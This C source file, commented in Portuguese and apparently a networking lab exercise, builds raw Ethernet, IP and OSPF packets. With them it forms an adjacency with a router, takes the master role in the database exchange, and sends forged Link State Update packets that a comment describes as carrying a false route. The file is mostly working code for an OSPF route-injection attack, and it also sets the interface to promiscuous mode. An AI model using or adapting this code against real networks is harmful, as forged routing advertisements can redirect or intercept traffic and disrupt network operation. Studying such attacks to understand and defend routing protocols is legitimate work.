/*-------------------------------------------------------------*/
/* Exemplo Socket Raw - envio de mensagens                     */
/*-------------------------------------------------------------*/

#include <time.h>

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>//sys
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <arpa/inet.h> //funcoes para manipulacao de enderecos IP
#include <netinet/in_systm.h> //tipos de dados
#include <net/if.h>  //estrutura ifr
#include <netinet/in.h> //definicao de protocolos
#define BUFFSIZE 1518

/* Fletcher Checksum -- Refer to RFC1008. */
#define MODX                 4102   /* 5802 should be fine */

unsigned char buff1[BUFFSIZE]; // buffer de recepcao
int sockd;
int on;
struct ifreq ifr;

extern int errno;

//calcula checksum
unsigned short CheckSumFletcher(char *message, int mlen)   
   
{   
    char *ptr;   
    char *end;   
    int c0; // Checksum high byte   
    int c1; // Checksum low byte   
    unsigned short cksum;    // Concatenated checksum   
    int iq; // Adjust for message placement, high byte   
    int ir; // low byte  
    int offset = 0; 
   
    // Set checksum field to zero   
    if (offset) {   
    message[offset-1] = 0;   
    message[offset] = 0;   
    }   
   
    // Initialize checksum fields   
    c0 = 0;   
    c1 = 0;   
    ptr = message;   
    end = message + mlen;   
   
    // Accumulate checksum   
    while (ptr < end) {   
    char    *stop;   
    stop = ptr + MODX;   
    if (stop > end)   
        stop = end;   
    for (; ptr < stop; ptr++) {   
        c0 += *ptr;   
        c1 += c0;   
    }   
    // Ones complement arithmetic   
    c0 = c0 % 255;   
    c1 = c1 % 255;   
    }   
   
    // Form 16-bit result   
    cksum = (c1 << 8) + c0;   
   
    // Calculate and insert checksum field   
    if (offset) {   
    iq = ((mlen - offset)*c0 - c1) % 255;   
    if (iq <= 0)   
        iq += 255;   
    ir = (510 - c0 - iq);   
    if (ir > 255)   
        ir -= 255;   
    message[offset-1] = iq;   
    message[offset] = ir;   
    }   
   
    return(cksum);   
}  

unsigned short CheckSum(unsigned short *addr,int len)
{
    register int sum = 0;
    u_short answer = 0;
    register u_short *w = addr;
    register int nleft = len;

    /*
    * Our algorithm is simple, using a 32 bit accumulator (sum), we add
    * sequential 16 bit words to it, and at the end, fold back all the
    * carry bits from the top 16 bits into the lower 16 bits.
    */

    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }

   /* mop up an odd byte, if necessary */
    if (nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }
    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff);     /* add hi 16 to low 16 */
    sum += (sum >> 16);                     /* add carry */
    answer = ~sum;                          /* truncate to 16 bits */
    return(answer);
}

int main(){

    int sockFd = 0, retValue = 0;
    struct sockaddr_ll destAddr;

    /* Criacao do socket. Todos os pacotes devem ser construidos a partir do protocolo Ethernet. */
    /* htons: converte um short (2-byte) integer para standard network byte order. */
    if((sockFd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        printf("Erro na criacao do socket.\n");
        exit(1);
    }
    /* Configura MAC Origem e Destino */
    unsigned char localMac[sizeof(char)*6] = {0xa4, 0x1f, 0x72, 0xf5, 0x90, 0x83}; 
    unsigned char destMac[sizeof(char)*6] =  {0x01, 0x00, 0x5e, 0x00, 0x00, 0x05}; //{0x50, 0x3d, 0xe5, 0x81, 0xed, 0xce}; 
  
    /* Identicacao de qual maquina (MAC) deve receber a mensagem enviada no socket. */
    destAddr.sll_family = htons(PF_PACKET);
    destAddr.sll_protocol = htons(ETH_P_ALL);
    destAddr.sll_halen = 6;
    destAddr.sll_ifindex = 2;  /* indice da interface pela qual os pacotes serao enviados. Eh necessario conferir este valor. */
    memcpy(&(destAddr.sll_addr), destMac, sizeof(unsigned char)*6);

    //buffer contendo o hello inicial
    char *bufferHello = malloc(80);
    
    //cabecalho Ethernet
    unsigned char ethCabecalho[sizeof(unsigned char)*14] = {0x01, 0x00, 0x5e, 0x00, 0x00, 0x05, // 0x50, 0x3d, 0xe5, 0x81, 0xed, 0xce,  // MAC destino
                                                            0xa4, 0x1f, 0x72, 0xf5, 0x90, 0x83, // MAC origem
                                                            0x08, 0x00 // Next (IP)
                                                        };

    //junta no buffer do hello inicial o cabecalho ethernet
    memcpy(bufferHello, &ethCabecalho, 14*sizeof(unsigned char));
    
    //Configuração do endereço IP origem e destino
    unsigned char localIP[sizeof(unsigned char) *4] = {0xc0,0xa8, 0x04,0x0B};
    unsigned char destIP[sizeof(unsigned char) *4] = {0x0a, 0x20, 0x8f, 0xAA};  
   
    //cabecalho ip
    unsigned char ipCabecalho[sizeof(unsigned char)*20] = {0x45, // Version + IHL
                                                           0x00, // Type of Service
                                                           0x00, 0x44, // Total Length
                                                           0x00, 0x01, // Identification // !pode fazer um rand para sempre ser diferente!
                                                           0x00, 0x00, // Flags + Fragment Offset
                                                           0x01, // TTL
                                                           0x59, // Next Protocol (OSPF)
                                                           0x00, 0x00, // CheckSum // setado depois
                                                           0xc0, 0xa8, 0x04, 0x0B, // Source Adress
                                                           0xe0, 0x00, 0x00, 0x05 //0xc0, 0xa8, 0x04, 0x01 // Destination Address
                                                        };
    
    //calculo do CheckSum
    unsigned short int CheckSumIP = CheckSum(&ipCabecalho, 20);
    //int x = (number >> (8*n)) & 0xff http://stackoverflow.com/questions/7787423/c-get-nth-byte-of-integer
    ipCabecalho[10] = (CheckSumIP >> (8*0)) & 0xFF;
    ipCabecalho[11] = (CheckSumIP >> (8*1)) & 0xFF;
    
    //grava no buffer a parte referente ao IP no buffer do hello inicial
    memcpy(bufferHello+14*sizeof(unsigned char), &ipCabecalho, 20*sizeof(unsigned char));
    
    //cabecalho OSPF
    // type 1 -> Hello | 2 -> Database Description | 3 -> Link State Request
    //                 | 4 -> Link State Update    | 5 -> Link State Acknowledgement
    unsigned char OSPFCabecalho[sizeof(char)*24] = {  0x02, // Version
                                                      0x01, // Type 
                                                      0x00, 0x30, //Packet length
                                                      0xc0, 0xa8, 0x004, 0x0B, //router ID // ID do roteador onde o pacote se originou
                                                      0x00, 0x00, 0x00, 0x00, //area ID //links virtuais = 0
                                                      0x00, 0x00, //0x73, 0x41, // checksum
                                                      0x00, 0x00, // Autype (sem autenticação)
                                                      0x00, 0x00, 0x00, 0x00, //autentication
                                                      0x00, 0x00, 0x00, 0x00 //autentication

                                                    }; 

    // OSPF Hello 
    unsigned char OSPFHello[sizeof(char)*24] = { 0xff, 0xff, 0xff, 0x00, //Network Mask
                                                 0x00, 0x0a, // HelloInterval
                                                 0x02, //options
                                                 0x01, //rtr pri
                                                 0x00, 0x00, 0x00, 0x28, // RouterDeadInterval 
                                                 0xc0, 0xa8, 0x04, 0x01, // Designated Router 
                                                 0x00, 0x00, 0x00, 0x00, // Backup Designated Router
                                                 0xc0, 0xa8, 0x04, 0x01 //neighbor 
                                                }; 
    
    //uso apenas para calculo do checksum
    unsigned char OSPFCabecalhoHelloCheckSum[sizeof(char)*38] = {  0x02, // Version
                                                      0x01, // Type 
                                                      0x00, 0x30, //Packet length
                                                      0xc0, 0xa8, 0x004, 0x0B, //router ID // ID do roteador onde o pacote se originou
                                                      0x00, 0x00, 0x00, 0x00, //area ID //links virtuais = 0
                                                      0x00, 0x00, // checksum
                                                      //hello packet
                                                      0xff, 0xff, 0xff, 0x00, //Network Mask
                                                      0x00, 0x0a, // HelloInterval
                                                      0x02, //options
                                                      0x01, //rtr pri
                                                      0x00, 0x00, 0x00, 0x28, // RouterDeadInterval 
                                                      0xc0, 0xa8, 0x04, 0x01, // Designated Router 
                                                      0x00, 0x00, 0x00, 0x00, // Backup Designated Router
                                                      0xc0, 0xa8, 0x04, 0x01 //neighbor 
                                                    };

    unsigned short int checksumOSPF = CheckSum(&OSPFCabecalhoHelloCheckSum, 38);
    //checksum
    OSPFCabecalho[12] = (checksumOSPF >> (8*0)) & 0xFF;
    OSPFCabecalho[13] = (checksumOSPF >> (8*1)) & 0xFF;

    //grava cabecalho OSPF e hello no buffer do hello inicial
    memcpy(bufferHello+34*sizeof(unsigned char),&OSPFCabecalho,24*sizeof(unsigned char));
    memcpy(bufferHello+58*sizeof(unsigned char),&OSPFHello,24*sizeof(unsigned char));
    //montou a ultima parte do pacote bufferHello que é em broadcast
 


    //buffer contendo a mensagem de OSPF database description
    char *bufferDataBaseDescription = malloc(90);
    
    //aqui que arruma o mac do roteador
    ethCabecalho[0] = 0x50;
    ethCabecalho[1] = 0x3d;
    ethCabecalho[2] = 0xe5;
    ethCabecalho[3] = 0x81;
    ethCabecalho[4] = 0xed;
    ethCabecalho[5] = 0xce;

    //aqui que arruma o ip para o do roteador
    ipCabecalho[16] = 0xc0;
    ipCabecalho[17] = 0xa8;
    ipCabecalho[18] = 0x04;
    ipCabecalho[19] = 0x01;  

    //seta tamanho do ip
    ipCabecalho[3] = 0x34; 
    //zera checksum para novo calculo
    ipCabecalho[10] = 0x00;
    ipCabecalho[11] = 0x00;

    //calculo do CheckSum
    CheckSumIP = CheckSum(&ipCabecalho, 20);
    //int x = (number >> (8*n)) & 0xff http://stackoverflow.com/questions/7787423/c-get-nth-byte-of-integer
    ipCabecalho[10] = (CheckSumIP >> (8*0)) & 0xFF;
    ipCabecalho[11] = (CheckSumIP >> (8*1)) & 0xFF;

    //seta tipo
    OSPFCabecalho[1] = 0x02;
    //seta tamanho
    OSPFCabecalho[3] = 0x20;

    // OSPF Database Description
    unsigned char OSPFDataDesc[sizeof(char)*8] = {  0x05, 0xdc, // Interface MTU  
                                                    0x02, // Options
                                                    0x07, // 00000 I M (MS)
                                                    0x80, 0x00, 0x00, 0x01 // DD sequence number
                                                  }; 

    unsigned char OSPFCabecalhoDataBaseCheckSum[sizeof(char)*22] = {  0x02, // Version
                                                                      0x02, // Type 
                                                                      0x00, 0x20, //Packet length
                                                                      0xc0, 0xa8, 0x004, 0x0B, //router ID // ID do roteador onde o pacote se originou
                                                                      0x00, 0x00, 0x00, 0x00, //area ID //links virtuais = 0
                                                                      0x00, 0x00, // checksum
                                                                      //database packet
                                                                      0x05, 0xdc, // Interface MTU  
                                                                      0x02, // Options
                                                                      0x07, // 00000 I M (MS)
                                                                      0x80, 0x00, 0x00, 0x01 // DD sequence number
                                                                    };

    //uso para calculo do checksum
    checksumOSPF = CheckSum(&OSPFCabecalhoDataBaseCheckSum, 22);
    OSPFCabecalho[12] = (checksumOSPF >> (8*0)) & 0xFF; 
    OSPFCabecalho[13] = (checksumOSPF >> (8*1)) & 0xFF; 

    //grava no buffer do database description todos os cabecalhos
    memcpy(bufferDataBaseDescription, &ethCabecalho, 14*sizeof(unsigned char));
    memcpy(bufferDataBaseDescription+14*sizeof(unsigned char), &ipCabecalho, 20*sizeof(unsigned char));
    memcpy(bufferDataBaseDescription+34*sizeof(unsigned char),&OSPFCabecalho,24*sizeof(unsigned char));
    memcpy(bufferDataBaseDescription+58*sizeof(unsigned char),&OSPFDataDesc,8*sizeof(unsigned char));    

    //criação do socket para enviar 
    int sockd = 0;
    if((sockd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        printf("Erro na criacao do socket.\n");
        exit(1);
    }

    // O procedimento abaixo eh utilizado para "setar" a interface em modo promiscuo
    strcpy(ifr.ifr_name, "eth0");
    if(ioctl(sockd, SIOCGIFINDEX, &ifr) < 0)
        printf("erro no ioctl!");
    ioctl(sockd, SIOCGIFFLAGS, &ifr);
    ifr.ifr_flags |= IFF_PROMISC;
    ioctl(sockd, SIOCSIFFLAGS, &ifr);

    //uso para aguardar novo pacote
    time_t begin,end;
   
    //envia o pacote de hello
    if((retValue = sendto(sockFd, bufferHello, 82, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
        printf("ERROR! sendto() \n");
        exit(1);
    }

    //recebo o database description que ele quer ser o master
    begin= time(NULL);   
    while(difftime(time(NULL), begin) < 100 ){
        recv(sockd,(char *) &buff1, sizeof(buff1), 0x0);
        if (buff1[0] == localMac[0] && buff1[1] == localMac[1] && buff1[2] == localMac[2] && // meu MAC
            buff1[3] == localMac[3] && buff1[4] == localMac[4] && buff1[5] == localMac[5] 
            && buff1[35] == 0x02){
            //me respondeu dizendo que ele quer ser o master
            printf("%s\n", "manda db dizendo que quer ser master" );
            break;
        }
    }

    //enviar data base description setando eu como master
    if((retValue = sendto(sockFd, bufferDataBaseDescription, 66, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
        printf("ERROR! sendto() \n");
        exit(1);
    }     
    printf("%s\n", "mandei database" );

    begin= time(NULL);   
    while(difftime(time(NULL), begin) < 100 ){
        recv(sockd,(char *) &buff1, sizeof(buff1), 0x0);
        if (buff1[0] == localMac[0] && buff1[1] == localMac[1] && buff1[2] == localMac[2] && // meu MAC
            buff1[3] == localMac[3] && buff1[4] == localMac[4] && buff1[5] == localMac[5] 
            && buff1[35] == 0x02 && buff1[61] == 0x02){
            printf("%s\n", "manda db dizendo que aceita ser meu escravo" );
            break;
        }
    }

    int naoZero = 1;
    while(naoZero){
        //aumentando o numero de sequencia e também setando flags de M MS
	    bufferDataBaseDescription[61] = 0x03;
	    bufferDataBaseDescription[65] = bufferDataBaseDescription[65] + 1;
	    
	    //checksum do OSPF
	    OSPFCabecalhoDataBaseCheckSum[21] = bufferDataBaseDescription[65];
	    OSPFCabecalhoDataBaseCheckSum[17] = 0x03;
	    checksumOSPF = CheckSum(&OSPFCabecalhoDataBaseCheckSum, 22);
	    bufferDataBaseDescription[46] = (checksumOSPF >> (8*0)) & 0xFF; 
	    bufferDataBaseDescription[47]  = (checksumOSPF >> (8*1)) & 0xFF; 

	    //envia o pacote dizendo para ele mandar mais pacotes
	    if((retValue = sendto(sockFd, bufferDataBaseDescription, 66, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
	        printf("ERROR! sendto() \n");
	        exit(1);
	    }  

	    begin= time(NULL);   
	    while(difftime(time(NULL), begin) < 100 ){
	        recv(sockd,(char *) &buff1, sizeof(buff1), 0x0);
	        if (buff1[0] == localMac[0] && buff1[1] == localMac[1] && buff1[2] == localMac[2] && // meu MAC
	            buff1[3] == localMac[3] && buff1[4] == localMac[4] && buff1[5] == localMac[5] 
	            && buff1[35] == 0x02 && buff1[61] == 0x00){
	               printf("%s\n", "não tem mais pacotes para mandar" );
	               naoZero = 0;
	               break;
	        }
	        else if (buff1[0] == localMac[0] && buff1[1] == localMac[1] && buff1[2] == localMac[2] && // meu MAC
	            	 buff1[3] == localMac[3] && buff1[4] == localMac[4] && buff1[5] == localMac[5] 
	           		 && buff1[35] == 0x02 && buff1[61] == 0x02){
	               printf("%s\n", "ele ainda tem mais para mandar" );
	               break;
	        }
	    }
	}
		//envia o ultimo pacote dbd
		bufferDataBaseDescription[61] = 0x01;
	    bufferDataBaseDescription[65] = bufferDataBaseDescription[65] + 1;
	    
	    //checksum do OSPF
	    OSPFCabecalhoDataBaseCheckSum[21] = bufferDataBaseDescription[65];
	    OSPFCabecalhoDataBaseCheckSum[17] = 0x01;
	    checksumOSPF = CheckSum(&OSPFCabecalhoDataBaseCheckSum, 22);
	    bufferDataBaseDescription[46] = (checksumOSPF >> (8*0)) & 0xFF; 
	    bufferDataBaseDescription[47]  = (checksumOSPF >> (8*1)) & 0xFF; 

	    //envia o pacote dizendo para ele mandar mais pacotes
	    if((retValue = sendto(sockFd, bufferDataBaseDescription, 66, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
	        printf("ERROR! sendto() \n");
	        exit(1);
	    }  

	printf("%s\n", "acabou o processo, agora tem adjacencia!" );

	//buffer para pacote de ACK
	char *bufferLinkStateACK = malloc(100);	

    //seta tamanho do ip
    ipCabecalho[3] = 0x40; 
    //zera checksum para novo calculo
    ipCabecalho[10] = 0x00;
    ipCabecalho[11] = 0x00;	

    //calculo do CheckSum
    CheckSumIP = CheckSum(&ipCabecalho, 20);

    ipCabecalho[10] = (CheckSumIP >> (8*0)) & 0xFF;
    ipCabecalho[11] = (CheckSumIP >> (8*1)) & 0xFF;  

    //cabacalho OSPF para pacote ACK
	unsigned char OSPFCabecalhoLinkStateACK[sizeof(char)*24] = {   0x02, // Version
	                                                           	   0x05, // Type 
		                                                           0x00, 0x2c, //Packet length
		                                                           0xc0, 0xa8, 0x04, 0x0B, //router ID // ID do roteador onde o pacote se originou
		                                                           0x00, 0x00, 0x00, 0x00, //area ID //links virtuais = 0
		                                                           0x00, 0x00, // checksum
		                                                           0x00, 0x00, //autype
		                                                           0x00, 0x00, 0x00, 0x00, //autentication	                                                           
		                                                           0x00, 0x00, 0x00, 0x00, //autentication
																};

    //header LSA para ack
    unsigned char LSAHeaderACK[sizeof(char)*20] = { 	 0x0e, 0x10, // LS age
	                                                     0x02, // Options
	                                                     0x01, // LS type 1- ROuter LSA
	                                                     0xc0, 0xa8, 0x04, 0x0B, //  Link State ID 
	                                                     0xc0, 0xa8, 0x04, 0x0B, //  Advertising Router
	                                                     0x80, 0x00, 0x00, 0x01, //   LS sequence number     
	                                                     0x00, 0x00, //LS checksum
	                                                     0x00, 0x30, //  length
	                                                    }; 
    //checksum do pacote lsa ack
    unsigned char LSAHeaderACKCheckSum[sizeof(char)*18] = {   0x02, // Options
			                                                     0x01, // LS type 1- ROuter LSA
			                                                     0xc0, 0xa8, 0x04, 0x0B, //  Link State ID 
			                                                     0xc0, 0xa8, 0x04, 0x0B, //  Advertising Router
			                                                     0x80, 0x00, 0x00, 0x01, //   LS sequence number     
			                                                     0x00, 0x00, //LS checksum
			                                                     0x00, 0x30, //  length
			                                                    }; 	                                                    

    unsigned int checksumFle = CheckSumFletcher(LSAHeaderACKCheckSum,18);
    
    LSAHeaderACK[16] = (checksumFle >> (8*1)) & 0xFF; 
    LSAHeaderACK[17] = (checksumFle >> (8*0)) & 0xFF; 

    //checkk sum do cabecalho ospf para ls ack
	unsigned char OSPFCabecalhoLinkStateACKCheckSum[sizeof(char)*34] = {   0x02, // Version
		                                                           	    0x05, // Type 
			                                                            0x00, 0x2c, //Packet length
			                                                            0xc0, 0xa8, 0x04, 0x0B, //router ID // ID do roteador onde o pacote se originou
			                                                            0x00, 0x00, 0x00, 0x00, //area ID //links virtuais = 0
			                                                            0x00, 0x00, // checksum
	                                                           			//outro pacote
				 														0x0e, 0x10, // LS age
					                                                    0x02, // Options
					                                                    0x01, // LS type 1- ROuter LSA
					                                                    0xc0, 0xa8, 0x04, 0x0B, //  Link State ID 
					                                                    0xc0, 0xa8, 0x04, 0x0B, //  Advertising Router
					                                                    0x80, 0x00, 0x00, 0x01, //   LS sequence number     
					                                                    LSAHeaderACK[16], LSAHeaderACK[17], //LS checksum
					                                                    0x00, 0x30 //  length
																	};

	checksumOSPF = CheckSum(&OSPFCabecalhoLinkStateACKCheckSum, 34);
    OSPFCabecalhoLinkStateACK[12] = (checksumOSPF >> (8*0)) & 0xFF; 
    OSPFCabecalhoLinkStateACK[13] = (checksumOSPF >> (8*1)) & 0xFF; 

    //junta tudo no mesmo buffer para enviar
    memcpy(bufferLinkStateACK, &ethCabecalho, 14*sizeof(unsigned char));
    memcpy(bufferLinkStateACK+14*sizeof(unsigned char), &ipCabecalho, 20*sizeof(unsigned char));
    memcpy(bufferLinkStateACK+34*sizeof(unsigned char),&OSPFCabecalhoLinkStateACK,24*sizeof(unsigned char));
    memcpy(bufferLinkStateACK+58*sizeof(unsigned char),&LSAHeaderACK,20*sizeof(unsigned char));  //total 78

    //buffer contendo o pacote de OSPF linkstate update com a rota falsa
  	char *bufferLinkStateUpdate = malloc(100);
  	
  	// seta mac como broadcast
  	ethCabecalho[0] = 0x01;
	ethCabecalho[1] = 0x00;
	ethCabecalho[2] = 0x5e;
	ethCabecalho[3] = 0x00;
	ethCabecalho[4] = 0x00;
	ethCabecalho[5] = 0x05;

    //aqui que arruma o ip para multicast
    ipCabecalho[16] = 0xe0;
    ipCabecalho[17] = 0x00;
    ipCabecalho[18] = 0x00;
    ipCabecalho[19] = 0x05;  

    //seta tamanho do ip
    ipCabecalho[3] = 0x54; 
    //zera checksum para novo calculo
    ipCabecalho[10] = 0x00;
    ipCabecalho[11] = 0x00;

    //calculo do CheckSum
    CheckSumIP = CheckSum(&ipCabecalho, 20);
    ipCabecalho[10] = (CheckSumIP >> (8*0)) & 0xFF;
    ipCabecalho[11] = (CheckSumIP >> (8*1)) & 0xFF;  


    //pacote ospf
	unsigned char OSPFCabecalhoLinkState[sizeof(char)*28] = {  0x02, // Version
	                                                           0x04, // Type 
	                                                           0x00, 0x40, //Packet length
	                                                           0xc0, 0xa8, 0x04, 0x0B, //router ID // ID do roteador onde o pacote se originou
	                                                           0x00, 0x00, 0x00, 0x00, //area ID //links virtuais = 0
	                                                           0x00, 0x00, // checksum
	                                                           0x00, 0x00, //autype
	                                                           0x00, 0x00, 0x00, 0x00, //autentication	                                                           
	                                                           0x00, 0x00, 0x00, 0x00, //autentication
	                                                           0x00, 0x00, 0x00, 0x01 // #LSA
															};

    //header LSA 206
    unsigned char LSAHeaderUpdate[sizeof(char)*40] = { 	 0x0e, 0x10, // LS age
	                                                     0x02, // Options
	                                                     0x01, // LS type 1- ROuter LSA
	                                                     0xc0, 0xa8, 0x04, 0x0B, //  Link State ID 
	                                                     0xc0, 0xa8, 0x04, 0x0B, //  Advertising Router
	                                                     0x80, 0x00, 0x00, 0x01, //   LS sequence number     
	                                                     0x00, 0x00, //LS checksum
	                                                     0x00, 0x24, //  length
	                                                     0x02, //flag	                                                  
	                                                     0x00, 0x00, 0x01, //number of links	    
	                                                     0xc0, 0xa8, 0x69, 0x00, //ip address of designated router	                                                                                                         
	                                                     0xff, 0xff, 0xff, 0x00, //link data
	                                                     0x02, // link type
	                                                     0x00, //number of metrics
	                                                     0x00, 0x0a //metric
	                                                    }; 

    //usado para calculo do checksum do LSA
    unsigned char LSAHeaderUpdateCheckSum[sizeof(char)*34] = { 	 //0x00, 0x01, // LS age
			                                                     0x02, // Options
			                                                     0x01, // LS type 1- ROuter LSA
			                                                     0xc0, 0xa8, 0x04, 0x0B, //  Link State ID 
			                                                     0xc0, 0xa8, 0x04, 0x0B, //  Advertising Router
			                                                     0x80, 0x00, 0x00, 0x01, //   LS sequence number     
			                                                     0x00, 0x00, //LS checksum
			                                                     0x00, 0x24, //  length
			                                                     0x02, //flag	                                                  
			                                                     0x00, 0x00, 0x01, //number of links	    
			                                                     0xc0, 0xa8, 0x69, 0x00, //ip address of designated router	                                                                                                         
			                                                     0xff, 0xff, 0xff, 0x00, //link data
			                                                     0x02, // link type
			                                                     0x00, //number of metrics
			                                                     0x00, 0x0a //metric
			                                                    }; 	                                                    

    unsigned int teste = CheckSumFletcher(LSAHeaderUpdateCheckSum,34);
    
    LSAHeaderUpdate[16] = (teste >> (8*1)) & 0xFF; 
    LSAHeaderUpdate[17] = (teste >> (8*0)) & 0xFF; 

    //usado para calculo do checksum do OSPF
	unsigned char OSPFCabecalhoLinkStateCheckSum[sizeof(char)*62] = {   0x02, // Version
			                                                            0x04, // Type 
			                                                            0x00, 0x40, //Packet length
			                                                            0xc0, 0xa8, 0x04, 0x0B, //router ID // ID do roteador onde o pacote se originou
			                                                            0x00, 0x00, 0x00, 0x00, //area ID //links virtuais = 0
			                                                            0x00, 0x00, // checksum                                                        			
	                                                           			0x00, 0x00, 0x00, 0x01, // #LSA
	                                                           			//outro pacote
	                                                           			 0x0e, 0x10, // LS age
					                                                     0x02, // Options
					                                                     0x01, // LS type 1- ROuter LSA
					                                                     0xc0, 0xa8, 0x04, 0x0B, //  Link State ID 
					                                                     0xc0, 0xa8, 0x04, 0x0B, //  Advertising Router
					                                                     0x80, 0x00, 0x00, 0x01, //   LS sequence number     
					                                                     LSAHeaderUpdate[16], LSAHeaderUpdate[17], //LS checksum
					                                                     0x00, 0x24, //  length
					                                                     0x02, //flag	                                                  
					                                                     0x00, 0x00, 0x01, //number of links	    
					                                                     0xc0, 0xa8, 0x69, 0x00, //ip address of designated router	                                                                                                         
					                                                     0xff, 0xff, 0xff, 0x00, //link data
					                                                     0x02, // link type
					                                                     0x00, //number of metrics
					                                                     0x00, 0x0a //metric
																	};

	checksumOSPF = CheckSum(&OSPFCabecalhoLinkStateCheckSum, 62);
    OSPFCabecalhoLinkState[12] = (checksumOSPF >> (8*0)) & 0xFF; 
    OSPFCabecalhoLinkState[13] = (checksumOSPF >> (8*1)) & 0xFF; 

    //junta tudo no buffer
    memcpy(bufferLinkStateUpdate, &ethCabecalho, 14*sizeof(unsigned char));
    memcpy(bufferLinkStateUpdate+14*sizeof(unsigned char), &ipCabecalho, 20*sizeof(unsigned char));
    memcpy(bufferLinkStateUpdate+34*sizeof(unsigned char),&OSPFCabecalhoLinkState,28*sizeof(unsigned char));
    memcpy(bufferLinkStateUpdate+62*sizeof(unsigned char),&LSAHeaderUpdate,40*sizeof(unsigned char));  

	//buffer para lsupdate para network(estabeleer simetria)
  	char *bufferLinkStateUpdateNETWORK = malloc(100);

    //seta tamanho do ip
    ipCabecalho[3] = 0x50; 
    //zera checksum para novo calculo
    ipCabecalho[10] = 0x00;
    ipCabecalho[11] = 0x00;

    //calculo do CheckSum
    CheckSumIP = CheckSum(&ipCabecalho, 20);
    ipCabecalho[10] = (CheckSumIP >> (8*0)) & 0xFF;
    ipCabecalho[11] = (CheckSumIP >> (8*1)) & 0xFF;  


    OSPFCabecalhoLinkState[3] = 0x3c;

    //header LSA 206
    unsigned char LSAHeaderUpdateNETWORK[sizeof(char)*32] = { 	 0x0e, 0x99, // LS age
			                                                     0x22, // Options
			                                                     0x02, // LS type 1- ROuter LSA
			                                                     0xc0, 0xa8, 0x04, 0x0B, //  Link State ID 
			                                                     0xc0, 0xa8, 0x04, 0x0B, //  Advertising Router
			                                                     0x80, 0x00, 0x00, 0x04, //   LS sequence number     
			                                                     0x00, 0x00, //LS checksum
			                                                     0x00, 0x20, //  length                                                                                                        
			                                                     0xff, 0xff, 0xff, 0x00, //mask                                                                                                 
			                                                     0xc0, 0xa8, 0x04, 0x01, //attached router                                                                                               
			                                                     0xc0, 0xa8, 0x04, 0x0B //mask
			                                                };

    //utilizado para calculo do checksum do LSA
    unsigned char LSAHeaderUpdateCheckSumNETWORK[sizeof(char)*30] = { 	 0x02, // Options
					                                                     0x02, // LS type 1- ROuter LSA
					                                                     0xc0, 0xa8, 0x04, 0x0B, //  Link State ID 
					                                                     0xc0, 0xa8, 0x04, 0x0B, //  Advertising Router
					                                                     0x80, 0x00, 0x00, 0x04, //   LS sequence number     
					                                                     0x00, 0x00, //LS checksum
					                                                     0x00, 0x20, //  length                                                                                                        
					                                                     0xff, 0xff, 0xff, 0x00, //mask                                                                                                 
					                                                     0xc0, 0xa8, 0x04, 0x01, //attached router                                                                                               
					                                                     0xc0, 0xa8, 0x04, 0x0B //mask
			                                                    }; 	                                                    

    teste = CheckSumFletcher(LSAHeaderUpdateCheckSumNETWORK,30);    
    LSAHeaderUpdateNETWORK[16] = (teste >> (8*1)) & 0xFF; 
    LSAHeaderUpdateNETWORK[17] = (teste >> (8*0)) & 0xFF; 

    //utilizado para calculo do checksum do OSPF 
	unsigned char OSPFCabecalhoLinkStateCheckSumNETWORK[sizeof(char)*50] = {   0x02, // Version
					                                                           0x04, // Type 
					                                                           0x00, 0x3c, //Packet length
					                                                           0xc0, 0xa8, 0x04, 0x0B, //router ID // ID do roteador onde o pacote se originou
					                                                           0x00, 0x00, 0x00, 0x00, //area ID //links virtuais = 0
					                                                           0x00, 0x00, // checksum                                                      			
		                                                           				0x00, 0x00, 0x00, 0x01, // #LSA
		                                                           				//outro pacote
		                                                           				0x0e, 0x99, // LS age
							                                                     0x22, // Options
							                                                     0x02, // LS type 1- ROuter LSA
							                                                     0xc0, 0xa8, 0x04, 0x0B, //  Link State ID 
							                                                     0xc0, 0xa8, 0x04, 0x0B, //  Advertising Router
							                                                     0x80, 0x00, 0x00, 0x04, //   LS sequence number     
							                                                     LSAHeaderUpdateNETWORK[16], LSAHeaderUpdateNETWORK[17], //LS checksum 
							                                                     0x00, 0x20, //  length                                                                                                        
							                                                     0xff, 0xff, 0xff, 0x00, //mask                                                                                                 
							                                                     0xc0, 0xa8, 0x04, 0x01, //attached router                                                                                               
							                                                     0xc0, 0xa8, 0x04, 0x0B //mask				                                                  
																	};

	checksumOSPF = CheckSum(&OSPFCabecalhoLinkStateCheckSumNETWORK, 50);
    OSPFCabecalhoLinkState[12] = (checksumOSPF >> (8*0)) & 0xFF; 
    OSPFCabecalhoLinkState[13] = (checksumOSPF >> (8*1)) & 0xFF; 

    //junta tudo no pacote correto
    memcpy(bufferLinkStateUpdateNETWORK, &ethCabecalho, 14*sizeof(unsigned char));
    memcpy(bufferLinkStateUpdateNETWORK+14*sizeof(unsigned char), &ipCabecalho, 20*sizeof(unsigned char));
    memcpy(bufferLinkStateUpdateNETWORK+34*sizeof(unsigned char),&OSPFCabecalhoLinkState,28*sizeof(unsigned char));
    memcpy(bufferLinkStateUpdateNETWORK+62*sizeof(unsigned char),&LSAHeaderUpdateNETWORK,32*sizeof(unsigned char));  

    //devolve configurações de tamanho para o ip e ospf para envio dos pacotes de ack
    OSPFCabecalhoLinkState[3] = 0x40;
	ipCabecalho[3] = 0x54; 

	begin= time(NULL);   
	while(difftime(time(NULL), begin) < 2 ){}

	//envia o link state update
	if((retValue = sendto(sockFd, bufferLinkStateUpdateNETWORK, 94, 0, (struct sockaddr *)&(destAddr), sizeof(struct sockaddr_ll))) < 0) {
	    printf("ERROR! sendto() \n");
	    exit(1);
	}  
	printf("%s\n", "enviei bufferLinkStateUpdate de NETWORK");



